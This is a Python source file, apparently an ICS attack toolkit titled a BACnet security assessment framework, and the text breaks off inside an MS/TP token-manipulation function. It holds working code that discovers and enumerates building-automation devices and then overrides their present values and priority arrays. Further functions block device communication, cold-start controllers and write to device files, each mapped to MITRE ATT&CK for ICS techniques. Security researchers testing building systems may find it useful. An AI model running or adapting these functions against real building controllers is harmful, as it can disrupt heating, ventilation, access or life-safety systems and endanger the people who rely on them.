#!/usr/bin/env python3
"""
BACnet Security Assessment Framework v1.0

This module provides comprehensive security testing capabilities for BACnet networks,
including WriteProperty attacks, device binding manipulation, and MS/TP network attacks.

MITRE ATT&CK for ICS Mappings:
    - T0801: Monitor Process State
    - T0802: Automated Collection
    - T0803: Block Command Message
    - T0804: Block Reporting Message
    - T0836: Modify Parameter
    - T0855: Unauthorized Command Message
    - T0858: Change Operating Mode
    - T0861: Point & Tag Identification
    - T0868: Detect Operating Mode
    - T0871: Execution through API
    - T0873: Project File Infection
    - T0888: Remote System Information Discovery

Protocol: BACnet (Building Automation and Control Networks)
Author: ICS Security Research Team
Version: 1.0
"""

import argparse
import logging
import socket
import struct
import time
from dataclasses import dataclass, field
from enum import Enum, IntEnum
from typing import List, Dict, Tuple, Optional, Any, Union
import json
import threading

try:
    import serial
    SERIAL_AVAILABLE = True
except ImportError:
    SERIAL_AVAILABLE = False
    print("Warning: pyserial not available. MS/TP features disabled. Install with: pip install pyserial")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class BACnetPDUType(IntEnum):
    CONFIRMED_REQUEST = 0x00
    UNCONFIRMED_REQUEST = 0x10
    SIMPLE_ACK = 0x20
    COMPLEX_ACK = 0x30
    SEGMENT_ACK = 0x40
    ERROR = 0x50
    REJECT = 0x60
    ABORT = 0x70


class BACnetConfirmedService(IntEnum):
    ACKNOWLEDGE_ALARM = 0
    COV_NOTIFICATION = 1
    EVENT_NOTIFICATION = 2
    GET_ALARM_SUMMARY = 3
    GET_ENROLLMENT_SUMMARY = 4
    SUBSCRIBE_COV = 5
    ATOMIC_READ_FILE = 6
    ATOMIC_WRITE_FILE = 7
    ADD_LIST_ELEMENT = 8
    REMOVE_LIST_ELEMENT = 9
    CREATE_OBJECT = 10
    DELETE_OBJECT = 11
    READ_PROPERTY = 12
    READ_PROPERTY_CONDITIONAL = 13
    READ_PROPERTY_MULTIPLE = 14
    WRITE_PROPERTY = 15
    WRITE_PROPERTY_MULTIPLE = 16
    DEVICE_COMMUNICATION_CONTROL = 17
    CONFIRMED_PRIVATE_TRANSFER = 18
    CONFIRMED_TEXT_MESSAGE = 19
    REINITIALIZE_DEVICE = 20
    VT_OPEN = 21
    VT_CLOSE = 22
    VT_DATA = 23
    AUTHENTICATE = 24
    REQUEST_KEY = 25
    READ_RANGE = 26
    LIFE_SAFETY_OPERATION = 27
    SUBSCRIBE_COV_PROPERTY = 28
    GET_EVENT_INFORMATION = 29


class BACnetUnconfirmedService(IntEnum):
    I_AM = 0
    I_HAVE = 1
    UNCONFIRMED_COV_NOTIFICATION = 2
    UNCONFIRMED_EVENT_NOTIFICATION = 3
    UNCONFIRMED_PRIVATE_TRANSFER = 4
    UNCONFIRMED_TEXT_MESSAGE = 5
    TIME_SYNCHRONIZATION = 6
    WHO_HAS = 7
    WHO_IS = 8
    UTC_TIME_SYNCHRONIZATION = 9


class BACnetObjectType(IntEnum):
    ANALOG_INPUT = 0
    ANALOG_OUTPUT = 1
    ANALOG_VALUE = 2
    BINARY_INPUT = 3
    BINARY_OUTPUT = 4
    BINARY_VALUE = 5
    CALENDAR = 6
    COMMAND = 7
    DEVICE = 8
    EVENT_ENROLLMENT = 9
    FILE = 10
    GROUP = 11
    LOOP = 12
    MULTI_STATE_INPUT = 13
    MULTI_STATE_OUTPUT = 14
    NOTIFICATION_CLASS = 15
    PROGRAM = 16
    SCHEDULE = 17
    AVERAGING = 18
    MULTI_STATE_VALUE = 19
    TREND_LOG = 20
    LIFE_SAFETY_POINT = 21
    LIFE_SAFETY_ZONE = 22
    ACCUMULATOR = 23
    PULSE_CONVERTER = 24
    EVENT_LOG = 25
    GLOBAL_GROUP = 26
    TREND_LOG_MULTIPLE = 27
    LOAD_CONTROL = 28
    STRUCTURED_VIEW = 29
    ACCESS_DOOR = 30


class BACnetPropertyIdentifier(IntEnum):
    ACKED_TRANSITIONS = 0
    ACK_REQUIRED = 1
    ACTION = 2
    ACTION_TEXT = 3
    ACTIVE_TEXT = 4
    ACTIVE_VT_SESSIONS = 5
    ALARM_VALUE = 6
    ALARM_VALUES = 7
    ALL = 8
    ALL_WRITES_SUCCESSFUL = 9
    APDU_SEGMENT_TIMEOUT = 10
    APDU_TIMEOUT = 11
    APPLICATION_SOFTWARE_VERSION = 12
    ARCHIVE = 13
    BIAS = 14
    CHANGE_OF_STATE_COUNT = 15
    CHANGE_OF_STATE_TIME = 16
    NOTIFICATION_CLASS = 17
    CONTROLLED_VARIABLE_REFERENCE = 19
    CONTROLLED_VARIABLE_UNITS = 20
    CONTROLLED_VARIABLE_VALUE = 21
    COV_INCREMENT = 22
    DATE_LIST = 23
    DAYLIGHT_SAVINGS_STATUS = 24
    DEADBAND = 25
    DERIVATIVE_CONSTANT = 26
    DERIVATIVE_CONSTANT_UNITS = 27
    DESCRIPTION = 28
    DESCRIPTION_OF_HALT = 29
    DEVICE_ADDRESS_BINDING = 30
    DEVICE_TYPE = 31
    EFFECTIVE_PERIOD = 32
    ELAPSED_ACTIVE_TIME = 33
    ERROR_LIMIT = 34
    EVENT_ENABLE = 35
    EVENT_STATE = 36
    EVENT_TYPE = 37
    EXCEPTION_SCHEDULE = 38
    FAULT_VALUES = 39
    FEEDBACK_VALUE = 40
    FILE_ACCESS_METHOD = 41
    FILE_SIZE = 42
    FILE_TYPE = 43
    FIRMWARE_REVISION = 44
    HIGH_LIMIT = 45
    INACTIVE_TEXT = 46
    IN_PROCESS = 47
    INSTANCE_OF = 48
    INTEGRAL_CONSTANT = 49
    INTEGRAL_CONSTANT_UNITS = 50
    LIMIT_ENABLE = 52
    LIST_OF_GROUP_MEMBERS = 53
    LIST_OF_OBJECT_PROPERTY_REFERENCES = 54
    LOCAL_DATE = 56
    LOCAL_TIME = 57
    LOCATION = 58
    LOW_LIMIT = 59
    MANIPULATED_VARIABLE_REFERENCE = 60
    MAXIMUM_OUTPUT = 61
    MAX_APDU_LENGTH_ACCEPTED = 62
    MAX_INFO_FRAMES = 63
    MAX_MASTER = 64
    MAX_PRES_VALUE = 65
    MINIMUM_OFF_TIME = 66
    MINIMUM_ON_TIME = 67
    MINIMUM_OUTPUT = 68
    MIN_PRES_VALUE = 69
    MODEL_NAME = 70
    MODIFICATION_DATE = 71
    NOTIFY_TYPE = 72
    NUMBER_OF_APDU_RETRIES = 73
    NUMBER_OF_STATES = 74
    OBJECT_IDENTIFIER = 75
    OBJECT_LIST = 76
    OBJECT_NAME = 77
    OBJECT_PROPERTY_REFERENCE = 78
    OBJECT_TYPE = 79
    OPTIONAL = 80
    OUT_OF_SERVICE = 81
    OUTPUT_UNITS = 82
    EVENT_PARAMETERS = 83
    POLARITY = 84
    PRESENT_VALUE = 85
    PRIORITY = 86
    PRIORITY_ARRAY = 87
    PRIORITY_FOR_WRITING = 88
    PROCESS_IDENTIFIER = 89
    PROGRAM_CHANGE = 90
    PROGRAM_LOCATION = 91
    PROGRAM_STATE = 92
    PROPORTIONAL_CONSTANT = 93
    PROPORTIONAL_CONSTANT_UNITS = 94
    PROTOCOL_CONFORMANCE_CLASS = 95
    PROTOCOL_OBJECT_TYPES_SUPPORTED = 96
    PROTOCOL_SERVICES_SUPPORTED = 97
    PROTOCOL_VERSION = 98
    READ_ONLY = 99
    REASON_FOR_HALT = 100
    RELIABILITY = 103
    RELINQUISH_DEFAULT = 104
    REQUIRED = 105
    RESOLUTION = 106
    SEGMENTATION_SUPPORTED = 107
    SETPOINT = 108
    SETPOINT_REFERENCE = 109
    STATE_TEXT = 110
    STATUS_FLAGS = 111
    SYSTEM_STATUS = 112
    TIME_DELAY = 113
    TIME_OF_ACTIVE_TIME_RESET = 114
    TIME_OF_STATE_COUNT_RESET = 115
    TIME_SYNCHRONIZATION_RECIPIENTS = 116
    UNITS = 117
    UPDATE_INTERVAL = 118
    UTC_OFFSET = 119
    VENDOR_IDENTIFIER = 120
    VENDOR_NAME = 121
    VT_CLASSES_SUPPORTED = 122
    WEEKLY_SCHEDULE = 123
    ATTEMPTED_SAMPLES = 124
    AVERAGE_VALUE = 125
    BUFFER_SIZE = 126
    CLIENT_COV_INCREMENT = 127
    COV_RESUBSCRIPTION_INTERVAL = 128
    CURRENT_NOTIFY_TIME = 129
    EVENT_TIME_STAMPS = 130
    LOG_BUFFER = 131
    LOG_DEVICE_OBJECT_PROPERTY = 132
    ENABLE = 133
    LOG_INTERVAL = 134
    MAXIMUM_VALUE = 135
    MINIMUM_VALUE = 136
    NOTIFICATION_THRESHOLD = 137
    PROTOCOL_REVISION = 139
    RECORDS_SINCE_NOTIFICATION = 140
    RECORD_COUNT = 141
    START_TIME = 142
    STOP_TIME = 143
    STOP_WHEN_FULL = 144
    TOTAL_RECORD_COUNT = 145
    VALID_SAMPLES = 146
    WINDOW_INTERVAL = 147
    WINDOW_SAMPLES = 148
    MAXIMUM_VALUE_TIMESTAMP = 149
    MINIMUM_VALUE_TIMESTAMP = 150
    VARIANCE_VALUE = 151
    ACTIVE_COV_SUBSCRIPTIONS = 152
    BACKUP_FAILURE_TIMEOUT = 153
    CONFIGURATION_FILES = 154
    DATABASE_REVISION = 155
    DIRECT_READING = 156
    LAST_RESTORE_TIME = 157
    MAINTENANCE_REQUIRED = 158
    MEMBER_OF = 159
    MODE = 160
    OPERATION_EXPECTED = 161
    SETTING = 162
    SILENCED = 163
    TRACKING_VALUE = 164
    ZONE_MEMBERS = 165
    LIFE_SAFETY_ALARM_VALUES = 166
    MAX_SEGMENTS_ACCEPTED = 167
    PROFILE_NAME = 168


class BACnetApplicationTag(IntEnum):
    NULL = 0
    BOOLEAN = 1
    UNSIGNED_INT = 2
    SIGNED_INT = 3
    REAL = 4
    DOUBLE = 5
    OCTET_STRING = 6
    CHARACTER_STRING = 7
    BIT_STRING = 8
    ENUMERATED = 9
    DATE = 10
    TIME = 11
    OBJECT_IDENTIFIER = 12


class BACnetMSTPFrameType(IntEnum):
    TOKEN = 0x00
    POLL_FOR_MASTER = 0x01
    REPLY_TO_POLL_FOR_MASTER = 0x02
    TEST_REQUEST = 0x03
    TEST_RESPONSE = 0x04
    BACNET_DATA_EXPECTING_REPLY = 0x05
    BACNET_DATA_NOT_EXPECTING_REPLY = 0x06
    REPLY_POSTPONED = 0x07


@dataclass
class BACnetDevice:
    """BACnet device information"""
    instance_number: int
    ip_address: str
    port: int = 47808
    vendor_id: Optional[int] = None
    vendor_name: Optional[str] = None
    model_name: Optional[str] = None
    firmware_revision: Optional[str] = None
    application_software_version: Optional[str] = None
    protocol_version: Optional[int] = None
    protocol_revision: Optional[int] = None
    max_apdu_length: Optional[int] = None
    segmentation_supported: Optional[int] = None
    object_list: List[Tuple[int, int]] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "instance_number": self.instance_number,
            "ip_address": self.ip_address,
            "port": self.port,
            "vendor_id": self.vendor_id,
            "vendor_name": self.vendor_name,
            "model_name": self.model_name,
            "firmware_revision": self.firmware_revision,
            "application_software_version": self.application_software_version,
            "protocol_version": self.protocol_version,
            "protocol_revision": self.protocol_revision,
            "max_apdu_length": self.max_apdu_length,
            "segmentation_supported": self.segmentation_supported,
            "object_count": len(self.object_list)
        }


@dataclass
class BACnetObject:
    """BACnet object information"""
    object_type: int
    instance_number: int
    object_name: Optional[str] = None
    description: Optional[str] = None
    present_value: Optional[Any] = None
    status_flags: Optional[int] = None
    out_of_service: Optional[bool] = None
    priority_array: Optional[List[Any]] = None
    relinquish_default: Optional[Any] = None
    units: Optional[int] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "object_type": self.object_type,
            "instance_number": self.instance_number,
            "object_name": self.object_name,
            "description": self.description,
            "present_value": self.present_value,
            "status_flags": self.status_flags,
            "out_of_service": self.out_of_service,
            "units": self.units
        }


@dataclass
class SecurityEvent:
    """Security event for logging"""
    timestamp: str
    event_type: str
    severity: str
    target: str
    details: Dict[str, Any]
    mitre_techniques: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "timestamp": self.timestamp,
            "event_type": self.event_type,
            "severity": self.severity,
            "target": self.target,
            "details": self.details,
            "mitre_techniques": self.mitre_techniques
        }


@dataclass
class BACnetPacket:
    """BACnet packet structure"""
    bvlc_type: int
    bvlc_function: int
    npdu_version: int = 1
    npdu_control: int = 0
    apdu_type: int = BACnetPDUType.UNCONFIRMED_REQUEST
    service_choice: Optional[int] = None
    invoke_id: Optional[int] = None
    data: bytes = b''
    
    def to_bytes(self) -> bytes:
        packet = struct.pack('!BBH', self.bvlc_type, self.bvlc_function, 4 + 2 + len(self.data))
        packet += struct.pack('BB', self.npdu_version, self.npdu_control)
        if self.apdu_type in [BACnetPDUType.CONFIRMED_REQUEST, BACnetPDUType.COMPLEX_ACK]:
            if self.invoke_id is not None:
                packet += struct.pack('BBB', self.apdu_type, 0, self.invoke_id)
            else:
                packet += struct.pack('BBB', self.apdu_type, 0, 0)
        else:
            packet += struct.pack('B', self.apdu_type)
        if self.service_choice is not None:
            packet += struct.pack('B', self.service_choice)
        packet += self.data
        return packet
    
    @staticmethod
    def from_bytes(data: bytes) -> 'BACnetPacket':
        if len(data) < 6:
            raise ValueError("Packet too short")
        bvlc_type = data[0]
        bvlc_function = data[1]
        npdu_version = data[4]
        npdu_control = data[5]
        apdu_type = data[6]
        service_choice = None
        invoke_id = None
        packet_data = b''
        offset = 7
        if apdu_type in [BACnetPDUType.CONFIRMED_REQUEST, BACnetPDUType.COMPLEX_ACK]:
            if len(data) > 8:
                invoke_id = data[8]
                offset = 9
        if offset < len(data):
            service_choice = data[offset]
            packet_data = data[offset+1:]
        return BACnetPacket(
            bvlc_type=bvlc_type,
            bvlc_function=bvlc_function,
            npdu_version=npdu_version,
            npdu_control=npdu_control,
            apdu_type=apdu_type,
            service_choice=service_choice,
            invoke_id=invoke_id,
            data=packet_data
        )


class BACnetSecurityAssessment:
    """
    Comprehensive BACnet security assessment framework
    
    MITRE ATT&CK Techniques:
        T0801: Monitor Process State
        T0802: Automated Collection
        T0803: Block Command Message
        T0804: Block Reporting Message
        T0836: Modify Parameter
        T0855: Unauthorized Command Message
        T0858: Change Operating Mode
        T0861: Point & Tag Identification
        T0868: Detect Operating Mode
        T0871: Execution through API
        T0873: Project File Infection
        T0888: Remote System Information Discovery
    """
    
    def __init__(self, target_ip: str = "192.168.1.100", target_port: int = 47808):
        self.target_ip = target_ip
        self.target_port = target_port
        self.devices: List[BACnetDevice] = []
        self.objects: List[BACnetObject] = []
        self.security_events: List[SecurityEvent] = []
        self.sock: Optional[socket.socket] = None
        self.invoke_id = 1
        
    def log_event(self, event_type: str, severity: str, target: str, 
                  details: Dict[str, Any], mitre: List[str]) -> None:
        event = SecurityEvent(
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
            event_type=event_type,
            severity=severity,
            target=target,
            details=details,
            mitre_techniques=mitre
        )
        self.security_events.append(event)
        logger.info(f"[{severity}] {event_type}: {target}")
    
    def _create_socket(self) -> None:
        if self.sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.settimeout(5.0)
    
    def _close_socket(self) -> None:
        if self.sock:
            self.sock.close()
            self.sock = None
    
    def _send_packet(self, packet: BACnetPacket, target_ip: Optional[str] = None,
                     target_port: Optional[int] = None) -> Optional[bytes]:
        self._create_socket()
        ip = target_ip or self.target_ip
        port = target_port or self.target_port
        try:
            self.sock.sendto(packet.to_bytes(), (ip, port))
            response, _ = self.sock.recvfrom(1024)
            return response
        except socket.timeout:
            logger.warning(f"Timeout waiting for response from {ip}:{port}")
            return None
        except Exception as e:
            logger.error(f"Error sending packet: {e}")
            return None
    
    def _encode_unsigned(self, value: int) -> bytes:
        if value < 256:
            return struct.pack('!B', value)
        elif value < 65536:
            return struct.pack('!H', value)
        elif value < 16777216:
            return struct.pack('!I', value)[1:]
        else:
            return struct.pack('!I', value)
    
    def _encode_tag(self, tag_number: int, length_value_type: int, value: bytes) -> bytes:
        if len(value) < 5:
            tag = (tag_number << 4) | len(value)
            return struct.pack('B', tag) + value
        else:
            tag = (tag_number << 4) | 5
            return struct.pack('BB', tag, len(value)) + value
    
    def _encode_context_tag(self, tag_number: int, value: bytes) -> bytes:
        tag = 0x08 | (tag_number << 4)
        if len(value) < 5:
            tag |= len(value)
            return struct.pack('B', tag) + value
        else:
            tag |= 5
            return struct.pack('BB', tag, len(value)) + value
    
    def _encode_opening_tag(self, tag_number: int) -> bytes:
        tag = 0x0E | (tag_number << 4)
        return struct.pack('B', tag)
    
    def _encode_closing_tag(self, tag_number: int) -> bytes:
        tag = 0x0F | (tag_number << 4)
        return struct.pack('B', tag)
    
    def _encode_object_identifier(self, object_type: int, instance: int) -> bytes:
        obj_id = (object_type << 22) | (instance & 0x3FFFFF)
        return struct.pack('!I', obj_id)
    
    def discover_devices(self, broadcast_ip: str = "255.255.255.255") -> List[BACnetDevice]:
        """
        Discover BACnet devices using Who-Is broadcast
        
        MITRE: T0888 (Remote System Information Discovery), T0868 (Detect Operating Mode)
        
        Args:
            broadcast_ip: Broadcast address for device discovery
            
        Returns:
            List of discovered BACnet devices
        """
        logger.info(f"Starting BACnet device discovery on {broadcast_ip}")
        
        data = b''
        packet = BACnetPacket(
            bvlc_type=0x81,
            bvlc_function=0x0B,
            npdu_control=0x20,
            apdu_type=BACnetPDUType.UNCONFIRMED_REQUEST,
            service_choice=BACnetUnconfirmedService.WHO_IS,
            data=data
        )
        
        self._create_socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        
        try:
            self.sock.sendto(packet.to_bytes(), (broadcast_ip, 47808))
            discovered = []
            timeout_time = time.time() + 5
            
            while time.time() < timeout_time:
                try:
                    self.sock.settimeout(max(0.1, timeout_time - time.time()))
                    response, addr = self.sock.recvfrom(1024)
                    
                    if len(response) > 10:
                        try:
                            resp_packet = BACnetPacket.from_bytes(response)
                            if resp_packet.service_choice == BACnetUnconfirmedService.I_AM:
                                device_id = struct.unpack('!I', resp_packet.data[1:5])[0]
                                instance = device_id & 0x3FFFFF
                                
                                device = BACnetDevice(
                                    instance_number=instance,
                                    ip_address=addr[0],
                                    port=addr[1]
                                )
                                discovered.append(device)
                                self.devices.append(device)
                                
                                logger.info(f"Discovered device {instance} at {addr[0]}:{addr[1]}")
                        except Exception as e:
                            logger.debug(f"Error parsing I-Am response: {e}")
                except socket.timeout:
                    break
            
            self.log_event(
                "Device Discovery",
                "INFO",
                broadcast_ip,
                {"devices_found": len(discovered)},
                ["T0888", "T0868"]
            )
            
            return discovered
            
        except Exception as e:
            logger.error(f"Discovery error: {e}")
            return []
        finally:
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 0)
    
    def read_property(self, device_instance: int, object_type: int, 
                     object_instance: int, property_id: int) -> Optional[Any]:
        """
        Read a property from a BACnet object
        
        MITRE: T0801 (Monitor Process State), T0861 (Point & Tag Identification)
        
        Args:
            device_instance: Target device instance number
            object_type: BACnet object type
            object_instance: Object instance number
            property_id: Property identifier to read
            
        Returns:
            Property value if successful
        """
        logger.info(f"Reading property {property_id} from {object_type}:{object_instance}")
        
        data = b''
        data += self._encode_context_tag(0, self._encode_object_identifier(object_type, object_instance))
        data += self._encode_context_tag(1, self._encode_unsigned(property_id))
        
        self.invoke_id = (self.invoke_id % 255) + 1
        packet = BACnetPacket(
            bvlc_type=0x81,
            bvlc_function=0x0A,
            npdu_control=0x04,
            apdu_type=BACnetPDUType.CONFIRMED_REQUEST,
            service_choice=BACnetConfirmedService.READ_PROPERTY,
            invoke_id=self.invoke_id,
            data=data
        )
        
        response = self._send_packet(packet)
        
        if response:
            self.log_event(
                "Read Property",
                "INFO",
                f"{object_type}:{object_instance}",
                {"property": property_id},
                ["T0801", "T0861"]
            )
            return response
        return None
    
    def write_property(self, device_instance: int, object_type: int, 
                      object_instance: int, property_id: int, 
                      value: Any, priority: int = 8) -> bool:
        """
        Write a property value to a BACnet object (WriteProperty attack)
        
        MITRE: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)
        
        Args:
            device_instance: Target device instance number
            object_type: BACnet object type
            object_instance: Object instance number
            property_id: Property identifier to write
            value: Value to write
            priority: Write priority (1-16, where 1 is highest)
            
        Returns:
            True if write successful
        """
        logger.warning(f"[ATTACK] Writing to {object_type}:{object_instance} property {property_id}")
        
        data = b''
        data += self._encode_context_tag(0, self._encode_object_identifier(object_type, object_instance))
        data += self._encode_context_tag(1, self._encode_unsigned(property_id))
        
        data += self._encode_opening_tag(3)
        if isinstance(value, bool):
            data += self._encode_tag(BACnetApplicationTag.BOOLEAN, 0, struct.pack('B', 1 if value else 0))
        elif isinstance(value, int):
            data += self._encode_tag(BACnetApplicationTag.UNSIGNED_INT, 0, self._encode_unsigned(value))
        elif isinstance(value, float):
            data += self._encode_tag(BACnetApplicationTag.REAL, 0, struct.pack('!f', value))
        elif isinstance(value, str):
            encoded_str = value.encode('utf-8')
            data += self._encode_tag(BACnetApplicationTag.CHARACTER_STRING, 0, b'\x00' + encoded_str)
        data += self._encode_closing_tag(3)
        
        if priority is not None:
            data += self._encode_context_tag(4, self._encode_unsigned(priority))
        
        self.invoke_id = (self.invoke_id % 255) + 1
        packet = BACnetPacket(
            bvlc_type=0x81,
            bvlc_function=0x0A,
            npdu_control=0x04,
            apdu_type=BACnetPDUType.CONFIRMED_REQUEST,
            service_choice=BACnetConfirmedService.WRITE_PROPERTY,
            invoke_id=self.invoke_id,
            data=data
        )
        
        response = self._send_packet(packet)
        
        if response:
            self.log_event(
                "Write Property Attack",
                "CRITICAL",
                f"{object_type}:{object_instance}",
                {"property": property_id, "value": value, "priority": priority},
                ["T0855", "T0836"]
            )
            logger.warning("[SUCCESS] Write property completed")
            return True
        return False
    
    def enumerate_objects(self, device_instance: int) -> List[BACnetObject]:
        """
        Enumerate all objects on a BACnet device
        
        MITRE: T0861 (Point & Tag Identification), T0888 (Remote System Information Discovery)
        
        Args:
            device_instance: Target device instance number
            
        Returns:
            List of BACnet objects
        """
        logger.info(f"Enumerating objects on device {device_instance}")
        
        response = self.read_property(
            device_instance,
            BACnetObjectType.DEVICE,
            device_instance,
            BACnetPropertyIdentifier.OBJECT_LIST
        )
        
        objects = []
        
        if response:
            try:
                offset = 12
                while offset < len(response):
                    if offset + 4 <= len(response):
                        obj_id = struct.unpack('!I', response[offset:offset+4])[0]
                        obj_type = (obj_id >> 22) & 0x3FF
                        obj_instance = obj_id & 0x3FFFFF
                        
                        obj = BACnetObject(
                            object_type=obj_type,
                            instance_number=obj_instance
                        )
                        objects.append(obj)
                        self.objects.append(obj)
                        
                        offset += 5
                    else:
                        break
                
                self.log_event(
                    "Object Enumeration",
                    "INFO",
                    f"Device {device_instance}",
                    {"objects_found": len(objects)},
                    ["T0861", "T0888"]
                )
                
                logger.info(f"Found {len(objects)} objects")
            except Exception as e:
                logger.error(f"Error parsing object list: {e}")
        
        return objects
    
    def manipulate_priority_array(self, device_instance: int, object_type: int,
                                  object_instance: int, priority: int, value: Any) -> bool:
        """
        Manipulate BACnet priority array to override control
        
        MITRE: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)
        
        Args:
            device_instance: Target device instance number
            object_type: BACnet object type
            object_instance: Object instance number
            priority: Priority level (1-16)
            value: Value to write at priority level
            
        Returns:
            True if manipulation successful
        """
        logger.warning(f"[ATTACK] Priority array manipulation: priority {priority}")
        
        success = self.write_property(
            device_instance,
            object_type,
            object_instance,
            BACnetPropertyIdentifier.PRESENT_VALUE,
            value,
            priority
        )
        
        if success:
            self.log_event(
                "Priority Array Manipulation",
                "CRITICAL",
                f"{object_type}:{object_instance}",
                {"priority": priority, "value": value},
                ["T0855", "T0836"]
            )
        
        return success
    
    def device_communication_control(self, device_instance: int, 
                                    enable_disable: int, password: Optional[str] = None) -> bool:
        """
        Control device communication (block/enable)
        
        MITRE: T0803 (Block Command Message), T0804 (Block Reporting Message)
        
        Args:
            device_instance: Target device instance number
            enable_disable: 0=enable, 1=disable, 2=disable initiation
            password: Optional password for authentication
            
        Returns:
            True if successful
        """
        logger.warning(f"[ATTACK] Device communication control: mode {enable_disable}")
        
        data = b''
        data += self._encode_context_tag(0, struct.pack('B', 0))
        data += self._encode_context_tag(1, self._encode_unsigned(enable_disable))
        
        if password:
            data += self._encode_context_tag(2, password.encode('utf-8'))
        
        self.invoke_id = (self.invoke_id % 255) + 1
        packet = BACnetPacket(
            bvlc_type=0x81,
            bvlc_function=0x0A,
            npdu_control=0x04,
            apdu_type=BACnetPDUType.CONFIRMED_REQUEST,
            service_choice=BACnetConfirmedService.DEVICE_COMMUNICATION_CONTROL,
            invoke_id=self.invoke_id,
            data=data
        )
        
        response = self._send_packet(packet)
        
        if response:
            self.log_event(
                "Device Communication Control",
                "CRITICAL",
                f"Device {device_instance}",
                {"mode": enable_disable},
                ["T0803", "T0804"]
            )
            logger.warning("[SUCCESS] Communication control applied")
            return True
        return False
    
    def reinitialize_device(self, device_instance: int, 
                           reinitialized_state: int, password: Optional[str] = None) -> bool:
        """
        Reinitialize a BACnet device (warm/cold start)
        
        MITRE: T0858 (Change Operating Mode), T0871 (Execution through API)
        
        Args:
            device_instance: Target device instance number
            reinitialized_state: 0=coldstart, 1=warmstart, 2=startbackup, 3=endbackup, 4=startrestore, 5=endrestore, 6=abortrestore
            password: Optional password for authentication
            
        Returns:
            True if successful
        """
        logger.warning(f"[ATTACK] Device reinitialization: state {reinitialized_state}")
        
        data = b''
        data += self._encode_context_tag(0, self._encode_unsigned(reinitialized_state))
        
        if password:
            data += self._encode_context_tag(1, password.encode('utf-8'))
        
        self.invoke_id = (self.invoke_id % 255) + 1
        packet = BACnetPacket(
            bvlc_type=0x81,
            bvlc_function=0x0A,
            npdu_control=0x04,
            apdu_type=BACnetPDUType.CONFIRMED_REQUEST,
            service_choice=BACnetConfirmedService.REINITIALIZE_DEVICE,
            invoke_id=self.invoke_id,
            data=data
        )
        
        response = self._send_packet(packet)
        
        if response:
            self.log_event(
                "Device Reinitialization",
                "CRITICAL",
                f"Device {device_instance}",
                {"state": reinitialized_state},
                ["T0858", "T0871"]
            )
            logger.warning("[SUCCESS] Device reinitialized")
            return True
        return False
    
    def subscribe_cov(self, device_instance: int, object_type: int,
                     object_instance: int, confirmed: bool = True,
                     lifetime: int = 0) -> bool:
        """
        Subscribe to Change-of-Value (COV) notifications
        
        MITRE: T0801 (Monitor Process State), T0802 (Automated Collection)
        
        Args:
            device_instance: Target device instance number
            object_type: BACnet object type to monitor
            object_instance: Object instance number
            confirmed: Request confirmed notifications
            lifetime: Subscription lifetime in seconds (0 = indefinite)
            
        Returns:
            True if subscription successful
        """
        logger.info(f"Subscribing to COV for {object_type}:{object_instance}")
        
        data = b''
        data += self._encode_context_tag(0, struct.pack('B', 0))
        data += self._encode_context_tag(1, self._encode_object_identifier(object_type, object_instance))
        data += self._encode_context_tag(2, struct.pack('B', 1 if confirmed else 0))
        data += self._encode_context_tag(3, self._encode_unsigned(lifetime))
        
        self.invoke_id = (self.invoke_id % 255) + 1
        packet = BACnetPacket(
            bvlc_type=0x81,
            bvlc_function=0x0A,
            npdu_control=0x04,
            apdu_type=BACnetPDUType.CONFIRMED_REQUEST,
            service_choice=BACnetConfirmedService.SUBSCRIBE_COV,
            invoke_id=self.invoke_id,
            data=data
        )
        
        response = self._send_packet(packet)
        
        if response:
            self.log_event(
                "COV Subscription",
                "INFO",
                f"{object_type}:{object_instance}",
                {"confirmed": confirmed, "lifetime": lifetime},
                ["T0801", "T0802"]
            )
            logger.info("[SUCCESS] COV subscription established")
            return True
        return False
    
    def atomic_write_file(self, device_instance: int, file_instance: int,
                         file_data: bytes, file_position: int = 0) -> bool:
        """
        Write to a BACnet file object
        
        MITRE: T0873 (Project File Infection), T0871 (Execution through API)
        
        Args:
            device_instance: Target device instance number
            file_instance: File object instance number
            file_data: Data to write to file
            file_position: Starting position in file
            
        Returns:
            True if write successful
        """
        logger.warning(f"[ATTACK] Atomic file write to file instance {file_instance}")
        
        data = b''
        data += self._encode_context_tag(0, self._encode_object_identifier(BACnetObjectType.FILE, file_instance))
        data += self._encode_opening_tag(1)
        data += self._encode_tag(BACnetApplicationTag.SIGNED_INT, 0, struct.pack('!i', file_position))
        data += self._encode_tag(BACnetApplicationTag.OCTET_STRING, 0, file_data)
        data += self._encode_closing_tag(1)
        
        self.invoke_id = (self.invoke_id % 255) + 1
        packet = BACnetPacket(
            bvlc_type=0x81,
            bvlc_function=0x0A,
            npdu_control=0x04,
            apdu_type=BACnetPDUType.CONFIRMED_REQUEST,
            service_choice=BACnetConfirmedService.ATOMIC_WRITE_FILE,
            invoke_id=self.invoke_id,
            data=data
        )
        
        response = self._send_packet(packet)
        
        if response:
            self.log_event(
                "Atomic File Write",
                "CRITICAL",
                f"File {file_instance}",
                {"size": len(file_data), "position": file_position},
                ["T0873", "T0871"]
            )
            logger.warning("[SUCCESS] File write completed")
            return True
        return False
    
    def mstp_token_manipulation(self, serial_port: str, this_station: int,
                               next_station: int, token_count: int = 255) -> None:
        """
        Manipulate MS/TP token passing
        
        MITRE: T0803 (Block Command Message), T0804 (Block Reporting Message)
        
        Args:
            serial_port: Serial port for MS/TP network
            this_station: Source station address
            next_station: Destination station address
            token_count: Token count value
        """
        if not SERIAL_AVAILABLE:
            logger.error("pyserial not available. Install with: pip install pyserial")
            return
        
        logger.warning(f"[ATTACK] MS/TP token manipulation on {serial_port}")
        
        try:
            ser = serial.Serial(serial_port, 38400, timeout=1)
            
            preamble = bytes([0x55, 0xFF])
            frame_type = BACnetMSTPFrameType.TOKEN
            destination = next_station
            source = this_station
            data_length = 0
            crc_header = 0xFF
